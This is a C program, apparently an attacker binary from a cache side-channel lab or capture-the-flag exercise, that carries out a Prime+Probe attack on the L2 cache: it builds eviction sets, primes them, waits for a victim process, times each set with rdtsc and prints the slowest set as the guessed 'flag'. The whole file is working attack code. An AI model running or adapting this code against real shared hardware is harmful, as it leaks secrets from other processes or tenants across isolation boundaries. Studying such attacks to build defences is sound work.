#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include "util.h"

#define NUM_L2_CACHE_SETS 1024
#define WAYS 16
#define LINE_SIZE 64
#define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)

#define REPEATS 2000

volatile uint8_t *buf;
volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

static inline uint64_t rdtsc(){
    unsigned hi, lo;
    asm volatile ("mfence");
    asm volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    asm volatile ("mfence");
    return ((uint64_t)hi << 32) | lo;
}

int main() {

    printf("Attacker ready. Prime+Probe starting...\n");

    /* allocate large buffer */
    posix_memalign((void**)&buf, 4096, NUM_L2_CACHE_SETS * STRIDE);

    /* build eviction sets */
    for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        for(int w = 0; w < WAYS; w++) {
            eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
        }
    }

    volatile uint8_t tmp = 0;

    while(1) {

        uint64_t scores[NUM_L2_CACHE_SETS] = {0};

        for(int r = 0; r < REPEATS; r++) {

            /* PRIME */
            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                for(int w = 0; w < WAYS; w++) {
                    tmp ^= *eviction_sets[set][w];
                }
            }

            /* give victim time */
            usleep(500);

            /* PROBE */
            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {

                uint64_t start = rdtsc();

                for(int w = WAYS-1; w >= 0; w--){
                    tmp ^= *eviction_sets[set][w];
                }

                uint64_t end = rdtsc();

                scores[set] += (end - start);
            }
        }

        /* find max latency */
        int best_set = 0;
        uint64_t max_score = 0;

        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            uint64_t avg = scores[set] / REPEATS;

            if(avg > max_score) {
                max_score = avg;
                best_set = set;
            }
        }

        printf("Guessed flag: %d (latency=%lu)\n", best_set, max_score);

        usleep(500000);
    }

    return 0;
}